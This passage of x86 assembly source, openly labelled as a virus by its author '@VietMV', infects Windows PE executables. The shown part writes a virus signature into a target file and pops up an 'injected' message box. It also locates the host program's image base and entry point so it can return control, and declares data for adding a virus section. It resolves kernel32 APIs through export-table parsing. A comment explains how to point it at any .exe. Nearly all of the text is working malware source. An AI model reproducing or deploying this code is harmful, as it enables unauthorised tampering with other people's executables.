	push 4										;nNumberOfBytesToWrite		= Size of DWORD = 4 Byte 
	lea ebx, [dwVirusSignature + ebp]					;---\
	push ebx										;----\lpBuffer				= EntryPoint Of Virus = dwVirusVirtualAddress
	push [dwhFileTarget + ebp]						;hFile	
	call [dwFnWriteFile + ebp]						
	
	pop ebx
	pop eax
ret

ShowVirusMessage:
	push ebx
	
	push 0								; uType = MB_OK = 0
	lea ebx, [szVirusTitle + ebp]				;---\
	push ebx								;----\ lpCaption = szVirusTitle
	lea ebx, [szVirusMessage + ebp]			;---\
	push ebx								;----\ lpText = szVirusMessage
	push 0								; hWnd	= NULL = 0
	call [dwFnMessageBox + ebp]				; <=>	MessageBox(NULL, szVirusMessage, szVirusTitle, MB_OK)
	
	pop ebx
ret

GetEntryPointOfMainProgram:
	
	push eax
	push ebx
	
	;Get ImageBase Of Main Program For Jumping to Main Program
	push 0
	call [dwFnGetModuleHandle + ebp]
	mov [dwImageBaseOfMainProgram + ebp], eax
	
	;Get EntrypointOfMainProgram in CheckSum Record of Main Program
	; Goto CheckSum Record of Main Program
	mov ebx, [eax + 3Ch]
	add eax,  ebx
	mov ebx, [eax + 58h]
	
	add ebx, [dwImageBaseOfMainProgram + ebp]
	mov [dwVAEntryPointOfMainProgram + ebp], ebx
	
	pop ebx
	pop eax
ret

 pbPEHeaderBuffer				dd 410h dup (0)
 
 dwPEOffset					dd 0
 dwVirusSignature				dd 73726956h			; 0x73726956 = "Virs"
 dwOriginalEntryPoint			dd 0
 dwOriginalEntryPointOffset		dd 0
 dwCheckSumOffset				dd 0
 dwNewSizeOfImage			dd 0
 dwVirusEntryPoint				dd 0
 
 ; Declare Virus Section Header
 dwVirusVirtualSize				dd 0
 dwVirusVirtualAddress			dd 0
 dwVirusRawSize				dd 0
 dwVirusRawAddress			dd 0				
 dwVirusCharacteristics			dd 0
 wNumberOfSection				dw 0
 
 ; Last Section Data
 dwOffsetLastSection			dd 0
 dwVirtualSizeOfLastSection		dd 0
 dwVirtualAddressOfLastSection	dd 0
 dwRawSizeOfLastSection		dd 0
 dwRawAddressOfLastSection		dd 0
 
 dwOffsetOfSectionTable			dd 0

dwNumberOfBytesWritten		dd 0

dwSectionAlignment			dd 0
dwFileAlignment				dd 0
dwVirusSize					dd 0

dwKernelBase 					dd 0
dwImageBaseOfMainProgram		dd 0
dwVAEntryPointOfMainProgram	dd 0

dwGetProcAddress 				dd 0
dwExportDirectory				dd 120h
dwNumberOfNameFunction		dd 0
dwExportTableVA				dd 0

dwArrAddrOfFunctions			dd 0
dwArrAddrOfNames				dd 0
dwArrAddrOfNameOdinals		dd 0

dwLenOfStrLoadLibrary			dd 0Dh 			; dwLenOfStrLoadLibrary 			= strlen("LoadLibraryA") + 1
dwLenOfStrGetProcessAddress	dd 0Fh			; dwlenOfStrGetProcessAddress	= strlen("GetProcessAddress") + 1

dwFunctionName				dd 0
dwLenOfFuntionName			dd 0

dwNumberReaded				dd 0

dwFileSizeLow					dd 0
dwFileSizeHigh				dd 0

dwhFileTarget					dd 0

dwFnLoadLibraryA 				dd 0
dwFnGetProcAddress 			dd 0

dwFnCreateFileA				dd 0
dwFnReadFile					dd 0
dwFnWriteFile					dd 0
dwFnCloseHanle				dd 0
dwFnSetFilePointer				dd 0
dwFnGetFileSizeEx				dd 0
dwFnGetModuleHandle			dd 0
dwFnMessageBox				dd 0


szKernel32DLL		db	"kernel32.dll",0
szUser32DLL			db	"user32.dll",0

; List Name Of Windows API Virus usage
szLoadLibraryA 		db 	"LoadLibraryA",0
szGetProcAddress 		db 	"GetProcAddress", 0

szCreateFileA 			db	"CreateFileA",0
szReadFile			db	 "ReadFile", 0
szWriteFile			db	 "WriteFile",0
szCloseFile			db 	"CloseHandle",0
szSetFilePointer		db	"SetFilePointer",0
szGetFileSizeEx		db	"GetFileSizeEx", 0
szGetModuleHandle	db	"GetModuleHandleA",0
szMessageBox			db	"MessageBoxA",0

szVirusMessage		db 	"File had Injected Virus \n Cslick Ok For Continue Main Program",0
szVirusTitle			db	"@VietMV - Virus Message",0

szTargetFile			db	"Example.exe",0			; Virus will inject virus code into file name "Example.exe in same folder of Virus. 
												; You can inject virus code into any exe file with setting full path for szTargetFile variable

Padding				dd 10h dup (0)

EndVirus:

End	Start
